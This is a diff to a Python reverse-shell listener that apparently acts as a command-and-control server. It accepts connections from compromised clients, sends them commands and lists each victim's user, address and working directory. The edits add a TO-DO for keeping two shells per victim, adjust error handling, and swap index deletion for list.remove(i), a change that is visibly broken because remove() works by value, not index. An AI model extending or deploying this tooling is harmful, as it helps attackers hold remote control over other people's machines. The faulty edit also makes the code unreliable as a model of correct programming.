@@ -14,6 +14,10 @@ elif len(sys.argv) == 3:
     SERVER_ADDR = sys.argv[1]
     SERVER_PORT = sys.argv[2]
 
+'''
+TO-DO: ESTABLISH TWO SHELLS IN CASE ONE DIES
+'''
+
 
 server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_sock.bind((SERVER_ADDR, SERVER_PORT))
@@ -62,9 +66,12 @@ def handleClient(client_sock,addr):
             print(f"{addr[0]}>",end='')
         except BrokenPipeError as e:
             print(e)
+            print(f"{addr[0]}>",end='')
             continue
         except Exception as e:
             print("Error sending command! \n" + str(e))
+            print(f"{addr[0]}>",end='')
+            continue
     
 
 def handleCommand():
@@ -109,11 +116,11 @@ def list_clients():
             whoami = client.recv(201480).decode()
             whoami = whoami.strip()
             if cwd is None:
-                del CURRENT_CONNECTIONS[i]
-                del CURRENT_ADDRESSES[i]
+                CURRENT_CONNECTIONS.remove(i)
+                CURRENT_ADDRESSES.remove(i)
         except:
-            del CURRENT_CONNECTIONS[i]
-            del CURRENT_ADDRESSES[i]
+            CURRENT_CONNECTIONS.remove(i)
+            CURRENT_ADDRESSES.remove(i)
             continue
 
         results += str(i) + " - " + whoami + "@" + str(CURRENT_ADDRESSES[i][0]) + ":" + str(CURRENT_ADDRESSES[i][1]) + ":" + str(cwd) + "\n"
